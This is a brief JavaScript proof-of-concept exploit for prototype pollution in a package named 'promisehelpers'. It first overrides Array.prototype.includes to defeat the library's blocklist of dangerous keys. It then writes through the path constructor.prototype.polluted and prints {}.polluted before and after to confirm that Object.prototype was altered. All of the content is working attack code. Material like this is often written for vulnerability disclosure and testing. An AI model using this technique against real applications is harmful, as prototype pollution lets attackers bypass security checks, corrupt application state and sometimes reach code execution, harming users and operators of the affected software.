Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const promisehelpers = require('promisehelpers');
obj = {};
console.log({}.polluted);
promisehelpers.insert([
    'constructor',
    'prototype',
    'polluted'
], 'yes')(obj);
console.log({}.polluted);